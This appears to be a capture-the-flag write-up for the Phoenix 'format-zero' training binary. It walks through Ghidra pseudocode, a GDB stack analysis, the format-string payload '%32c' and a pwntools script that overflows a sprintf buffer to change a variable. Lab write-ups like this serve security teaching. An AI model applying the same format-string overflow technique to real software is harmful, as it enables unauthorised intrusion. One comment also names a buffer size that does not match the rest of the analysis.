# &#35; format-0

#### &#42; pseudocode using ghidra
```bash

void main(void)

{
  char *pcVar1;
  undefined *puVar2;
  undefined auStack80 [12];
  char local_44 [15];
  undefined local_35;
  undefined local_34 [32];
  int local_14;
  undefined *puStack12;
  
  puStack12 = &stack0x00000004;
  puts("Welcome to phoenix/format-zero, brought to you by https://exploit.education");
  pcVar1 = fgets(local_44,0xf,stdin);
  puVar2 = auStack80;
  if (pcVar1 == (char *)0x0) {
    errx();
    puVar2 = &stack0xffffffa0;
  }
  local_35 = 0;
  local_14 = 0;
  *(char **)(puVar2 + -0xc) = local_44;
  *(undefined **)(puVar2 + -0x10) = local_34;
  *(undefined4 *)(puVar2 + -0x14) = 0x804859b;
  sprintf(*(char **)(puVar2 + -0x10),*(char **)(puVar2 + -0xc));
  if (local_14 == 0) {
    *(char **)(puVar2 + -0x10) =
         "Uh oh, \'changeme\' has not yet been changed. Would you like to try again?";
    *(undefined4 *)(puVar2 + -0x14) = 0x80485c4;
    puts(*(char **)(puVar2 + -0x10));
  }
  else {
    *(char **)(puVar2 + -0x10) = "Well done, the \'changeme\' variable has been changed!";
    *(undefined4 *)(puVar2 + -0x14) = 0x80485b2;
    puts(*(char **)(puVar2 + -0x10));
  }
  *(undefined4 *)(puVar2 + -0x10) = 0;
                    /* WARNING: Subroutine does not return */
  *(undefined4 *)(puVar2 + -0x14) = 0x80485d1;
  exit(*(int *)(puVar2 + -0x10));
}

```

#### &#42; check binary
```bash
$ file /opt/phoenix/i486/format-zero
/opt/phoenix/i486/format-zero: setuid, setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV),
  dynamically linked, interpreter /opt/phoenix/i486-linux-musl/lib/ld-musl-i386.so.1, not stripped

$ checksec /opt/phoenix/i486/format-zero
[*] '/opt/phoenix/i486/format-zero'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
    RPATH:    '/opt/phoenix/i486-linux-musl/lib'

```


#### &#42; how it work
```bash
$ /opt/phoenix/i486/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
AAAA
Uh oh, 'changeme' has not yet been changed. Would you like to try again?

$ /opt/phoenix/i486/format-zero
Welcome to phoenix/format-zero, brought to you by https://exploit.education
AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
user@phoenix-amd64:~$

```

#### &#42; vulnerable point
#### buffer overflow on sprintf()
```bash
#### we can overwrite local_14 variable using local_54[64]
```


#### &#42; stack structure
#### local_34[32] + local_14[4] + sfp[4] + ret[4]
```bash

$ gdb /opt/phoenix/i486/format-zero -q
GEF for linux ready, type `gef' to start, `gef config' to configure
71 commands loaded for GDB 8.2.1 using Python engine 3.5
[*] 2 commands could not be loaded, run `gef missing` to know why.
Reading symbols from /opt/phoenix/i486/format-zero...(no debugging symbols found)...done.
gef> disas main
Dump of assembler code for function main:
   0x08048535 <+0>:	lea    ecx,[esp+0x4]
   0x08048539 <+4>:	and    esp,0xfffffff0
   0x0804853c <+7>:	push   DWORD PTR [ecx-0x4]
   0x0804853f <+10>:	push   ebp
   0x08048540 <+11>:	mov    ebp,esp
   0x08048542 <+13>:	push   ecx
   0x08048543 <+14>:	sub    esp,0x44
   0x08048546 <+17>:	sub    esp,0xc
   0x08048549 <+20>:	push   0x8048620
   0x0804854e <+25>:	call   0x8048350 <puts@plt>
   0x08048553 <+30>:	add    esp,0x10
   0x08048556 <+33>:	mov    eax,ds:0x8049878
   0x0804855b <+38>:	sub    esp,0x4
   0x0804855e <+41>:	push   eax
   0x0804855f <+42>:	push   0xf
   0x08048561 <+44>:	lea    eax,[ebp-0x3c]
   0x08048564 <+47>:	push   eax
   0x08048565 <+48>:	call   0x8048340 <fgets@plt>
   0x0804856a <+53>:	add    esp,0x10
   0x0804856d <+56>:	test   eax,eax
   0x0804856f <+58>:	jne    0x8048580 <main+75>
   0x08048571 <+60>:	sub    esp,0x8
   0x08048574 <+63>:	push   0x804866c
   0x08048579 <+68>:	push   0x1
   0x0804857b <+70>:	call   0x8048360 <errx@plt>
   0x08048580 <+75>:	mov    BYTE PTR [ebp-0x2d],0x0      => local_35 = 0;
   0x08048584 <+79>:	mov    DWORD PTR [ebp-0xc],0x0      => local_14 = 0
   0x0804858b <+86>:	sub    esp,0x8
   0x0804858e <+89>:	lea    eax,[ebp-0x3c]               => src string
   0x08048591 <+92>:	push   eax
   0x08048592 <+93>:	lea    eax,[ebp-0x2c]               => dst buffer
   0x08048595 <+96>:	push   eax
   0x08048596 <+97>:	call   0x8048370 <sprintf@plt>      
   0x0804859b <+102>:	add    esp,0x10
   0x0804859e <+105>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080485a1 <+108>:	test   eax,eax
   0x080485a3 <+110>:	je     0x80485b7 <main+130>
   0x080485a5 <+112>:	sub    esp,0xc
   0x080485a8 <+115>:	push   0x8048684
   0x080485ad <+120>:	call   0x8048350 <puts@plt>
   0x080485b2 <+125>:	add    esp,0x10
   0x080485b5 <+128>:	jmp    0x80485c7 <main+146>
   0x080485b7 <+130>:	sub    esp,0xc
   0x080485ba <+133>:	push   0x80486bc
   0x080485bf <+138>:	call   0x8048350 <puts@plt>
   0x080485c4 <+143>:	add    esp,0x10
   0x080485c7 <+146>:	sub    esp,0xc
   0x080485ca <+149>:	push   0x0
   0x080485cc <+151>:	call   0x8048380 <exit@plt>
End of assembler dump.


gef> x/24xw $ebp-0x2c
0xffffd61c:	0x41414141	0x41414141	0x41414141	0x00000a41
0xffffd62c:	0x00000000	0x00000000	0x00000000	0x00000000
0xffffd63c:	0x00000000	0x00000000	0xffffd660	0xffffd6dc
0xffffd64c:	0xf7f8f654	0xffffd6d4	0x00000001	0xffffd6dc
0xffffd65c:	0xf7f8f654	0x00000001	0xffffd6d4	0xffffd6dc
0xffffd66c:	0x00000008	0x00000011	0x00000000	0xf7f8f628

gef> x/4xw $ebp-0xc
0xffffd63c:	0x00000000	0x00000000	0xffffd660	0xffffd6dc

gef> p/d 0xffffd63c-0xffffd61c
$3 = 32
gef>

```

#### &#42; payload
```bash
## we can't normal overflow because input length is restricted
char local_44 [15];
pcVar1 = fgets(local_44,15,stdin);

## we can overflow using sprintf(buffer, [format string], src)
## local_34[32] + local_14[4] + sfp[4] + ret[4]
## $ebp-0x2c is buffer(local_34[32])
## $ebp-0xc is local_14
payload  = b""
payload += b"%32c"

```

#### &#42; exploit
```bash
$ cat exp_format0.py
from pwn import *

context.arch='i386'
context.log_level='debug'

filename="/opt/phoenix/i486/format-zero"
conn = process(filename)

payload  = b""
payload += b"%32c"

print( conn.recvline() )
conn.sendline(payload)

conn.interactive()




$ python exp_format0.py
[+] Starting local process '/opt/phoenix/i486/format-zero': pid 1991
[DEBUG] Received 0x4c bytes:
    'Welcome to phoenix/format-zero, brought to you by https://exploit.education\n'
Welcome to phoenix/format-zero, brought to you by https://exploit.education

[DEBUG] Sent 0x5 bytes:
    '%32c\n'
[*] Switching to interactive mode
[*] Process '/opt/phoenix/i486/format-zero' stopped with exit code 0 (pid 1991)
[DEBUG] Received 0x35 bytes:
    "Well done, the 'changeme' variable has been changed!\n"
Well done, the 'changeme' variable has been changed!
[*] Got EOF while reading in interactive
$

```


